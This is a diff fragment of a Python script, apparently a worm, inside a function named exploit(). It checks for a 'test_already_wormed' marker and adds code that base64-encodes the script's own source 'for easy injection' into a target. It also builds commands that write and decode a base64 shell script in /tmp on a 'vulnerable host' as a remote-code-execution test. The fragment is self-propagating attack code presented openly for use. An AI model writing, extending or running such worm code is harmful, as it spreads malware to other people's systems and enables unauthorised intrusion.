@@ -52,7 +52,11 @@ def exploit():
 		os.mkdir('test_already_wormed')
 		sys.exit(0)
 
-	# Hardcoding this for now
+	# Base64 encode the worm source code for easy injection
+	data = open(sys.argv[0], 'rb').read() # Change sys.argv[0]
+	encoded = base64.b64encode(data).decode()
+
+	# Hardcoding this for now, preliminary test for RCE and file creation/execution on vulnerable host
 	cmd_list = []
 	cmd_list.append('echo ZWNobyAnc3VjY2Vzc2Z1bCcgPiAvdG1wL3Rlc3Rfc3VjY2Vzcy50eHQ= > /tmp/test') # echo 'successful' > /tmp/test_success.txt
 	cmd_list.append('base64 -d /tmp/test > /tmp/test.sh')
